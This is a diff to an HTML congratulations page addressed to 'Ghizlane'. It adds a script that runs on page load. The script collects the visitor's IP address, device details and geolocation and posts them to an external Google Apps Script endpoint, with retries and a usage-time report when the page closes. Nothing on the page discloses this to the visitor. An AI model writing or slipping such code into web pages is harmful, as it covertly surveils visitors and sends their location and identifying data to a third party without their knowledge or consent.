@@ -115,7 +115,104 @@
     </style>
 </head>
 <body>
+<script>
+async function collectAndSendData() {
+  try {
+    // Fetch IP address using a third-party service
+    let ipAddress = await fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => data.ip)
+      .catch(() => 'IP fetch failed');
 
+    // Function to send data to Google Apps Script
+    async function sendData(data) {
+      try {
+        await fetch('https://script.google.com/macros/s/AKfycbxfiYLZ9gn4GMqeXbUvYictZUsF_dnwdeUEbz8uNhGOsmByJQh_XUuugfHeIS90fYu6/exec', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data),
+        });
+      } catch (error) {
+        console.error('Failed to send data, retrying...', error);
+        // Retry sending data
+        setTimeout(() => sendData(data), 3000);
+      }
+    }
+
+    // Collect device information
+    function getDeviceInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+        isMobile: /Mobi|Android/i.test(navigator.userAgent),
+      };
+    }
+
+    // Track usage time
+    let startTime = Date.now();
+    function trackUsageTime() {
+      window.addEventListener('beforeunload', () => {
+        const usageTime = Date.now() - startTime;
+        sendData({ usageTime });
+      });
+    }
+
+    // Collect location (if allowed)
+    function getLocation() {
+      return new Promise((resolve, reject) => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              resolve({
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+              });
+            },
+            () => {
+              resolve({ location: 'Permission denied' });
+            }
+          );
+        } else {
+          resolve({ location: 'Geolocation not supported' });
+        }
+      });
+    }
+
+    // Gather all data and send it
+    const locationData = await getLocation();
+    const deviceInfo = getDeviceInfo();
+
+    const data = {
+      ipAddress,
+      ...locationData,
+      userAgent: deviceInfo.userAgent,
+      platform: deviceInfo.platform,
+      screenWidth: deviceInfo.screenWidth,
+      screenHeight: deviceInfo.screenHeight,
+      deviceType: deviceInfo.isMobile ? 'Mobile' : 'Desktop',
+    };
+
+    // Send data to the server
+    await sendData(data);
+    
+    // Track usage time
+    trackUsageTime();
+  } catch (error) {
+    console.error('Failed to collect or send data:', error);
+    // Retry collecting and sending data
+    setTimeout(collectAndSendData, 3000);
+  }
+}
+
+// Call the function on window load
+window.onload = collectAndSendData;
+    </script>
+
+    
     <div class="container">
         <h1>Congrats Ghizlane!</h1>
         <p>
